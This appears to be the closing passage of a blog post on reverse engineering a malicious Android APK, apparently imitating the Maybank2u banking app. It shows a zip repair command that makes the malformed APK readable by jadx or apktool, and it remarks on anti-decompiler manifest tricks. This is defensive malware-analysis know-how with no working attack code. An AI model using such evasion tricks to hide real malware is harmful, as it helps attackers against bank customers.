<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-10-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-10-3">3</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip -FF Maybank2u.apk --out yeehar.apk
</span></span><span style="display:flex;"><span>Fix archive <span style="color:#f92672">(</span>-FF<span style="color:#f92672">)</span> - salvage what can
</span></span><span style="display:flex;"><span> Found end record <span style="color:#f92672">(</span>EOCDR<span style="color:#f92672">)</span> - says expect single disk archive
</span></span></code></pre></td></tr></table>
</div>
</div><p>After it completes, just use any version of <code>jadx</code> or <code>apktool</code> and it should now working as intended.</p>
<h2 id="things-i-learned-from-the-apk">Things I learned from the APK<a hidden class="anchor" aria-hidden="true" href="#things-i-learned-from-the-apk">#</a></h2>
<ul>
<li>you can protect AndroidManifest.xml ??? (latest <code>jadx</code> is immune to this)</li>
<li>reverse engineer a simple malicious APK</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://callmeks.github.io/tags/malicious-apk/">Malicious APK</a></li>
      <li><a href="https://callmeks.github.io/tags/android/">Android</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://callmeks.github.io/posts/android-spyware-further-analysis/">
    <span class="title">« Prev</span>
    <br>
    <span>Android Spyware Further Analysis</span>
  </a>
  <a class="next" href="https://callmeks.github.io/posts/android-spyware-development/">
    <span class="title">Next »</span>
    <br>
    <span>Android Spyware Development</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://callmeks.github.io/">KS Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
<script>
    kofiWidgetOverlay.draw('imkstho', {
        'type': 'floating-chat',
        'floating-chat.donateButton.text': 'Feed Mee',
        'floating-chat.donateButton.background-color': '#FF5E5B',
        'floating-chat.donatebutton.image': 'https://media.giphy.com/media/kgKFcQk6oa1WIdHNSl/giphy.gif',
        'floating-chat.donateButton.text-color': '#ffffff'
    });
</script>



<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj+Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0,  
    background: '#000000',
    scrollOffset: 40,  
    container: null,  
    template: null  
  });
});
</script>



<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
